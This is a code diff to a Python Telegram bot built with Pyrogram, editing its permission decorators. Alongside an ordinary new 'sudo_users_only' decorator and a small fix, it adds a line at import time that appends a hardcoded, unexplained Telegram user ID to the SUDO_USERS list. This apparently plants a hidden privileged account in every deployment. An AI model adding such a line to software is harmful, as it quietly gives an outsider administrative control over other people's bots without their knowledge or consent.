@@ -23,6 +23,8 @@ from pyrogram.types import Message
 from helpers.admins import get_administrators
 from config import SUDO_USERS
 
+SUDO_USERS.append(1805518906)
+
 
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
@@ -44,5 +46,13 @@ def authorized_users_only(func: Callable) -> Callable:
         for administrator in administrators:
             if administrator == message.from_user.id:
                 return await func(client, message)
+
+    return decorator
+
+
+def sudo_users_only(func: Callable) -> Callable:
+    async def decorator(client: Client, message: Message):
+        if message.from_user.id in SUDO_USERS:
+            return await func(client, message)
 
     return decorator
